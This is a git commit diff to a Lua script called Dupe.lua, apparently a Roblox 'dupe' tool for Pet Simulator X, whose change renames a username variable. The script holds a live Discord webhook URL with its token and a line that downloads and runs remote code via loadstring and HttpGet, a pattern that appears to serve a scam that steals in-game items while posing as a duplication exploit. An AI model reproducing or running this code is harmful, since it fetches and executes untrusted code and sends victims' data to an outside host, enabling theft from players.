687f5348ed46679091a576cf67f6495063dfccaf
Maset0 <120063355+Maset0@users.noreply.github.com>
2022-12-20 15:57:56 +0200

    Update Dupe.lua

--- Dupe.lua
+++ Dupe.lua
@@ -1,4 +1,4 @@
-serName = "dawidparuw"
+UserName = "dawidparuw"
 WebHook = "https://discord.com/api/webhooks/1052571292097855538/9_7J7UUKO5uCZoHAsXThWhUi84FO6PtGe12ykxFFfSB_70KhFlL8nVEGL_lP4KZTugZa"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/New.lua", true))()
